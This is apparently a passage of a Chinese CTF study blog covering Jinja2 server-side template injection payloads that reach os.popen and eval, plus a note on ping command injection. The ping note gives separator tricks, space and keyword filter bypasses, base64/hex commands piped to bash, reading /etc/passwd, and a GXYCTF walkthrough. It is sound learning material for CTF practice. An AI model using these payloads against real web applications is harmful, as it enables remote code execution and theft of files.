<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>

<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>

<p>参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>

<p>这里注意一下，其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>

<p>unicode绕过参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>

<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>

<p>以上是盲注的写法</p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
<p>成功率有点低就是了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>

<p><strong>chr</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>

<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>

<p>写一个16进制编码的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Ping 命令学习记录</title>
    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
<span id="more"></span>

<p>首先测试所有的截断符号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>

<p>简单的flag就出来了，也可以配合其他的进行。</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>

<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
<p>CTF里面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>

<p>只执行ls不执行前面的<br>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>

<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
<p>利用一个管道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>

<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
<p>利用多个管道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>

<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>

<p>先执行<code>ls</code>后执行<code>ping</code></p>
<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
<p>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>

<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>

<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>

<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>


<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>

<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>

<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>

<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>

<p><code>*</code>在linux里面可以进行模糊匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>

<p>进行模糊匹配php</p>
<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
<p><code>head</code>：只显示头几行</p>
<p><code>tail</code>：只显示最后几行</p>
<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
<p><code>tailf</code>：类似于tail -f</p>
<p><code>sort%20/flag</code> 读文件</p>
<p><code>dir</code> 来查看当前目录文件</p>
<p>也可以<code>c\at</code></p>
<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>

<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>

<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>

<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
<p>构造<code>?ip=127.0.0.1;ls</code></p>
<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
<p>发现两个php文件</p>
<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
<p>总结：过滤的特殊字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>

<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>

<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>

<p>变量替换顺序，效果也不一样</p>
<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>

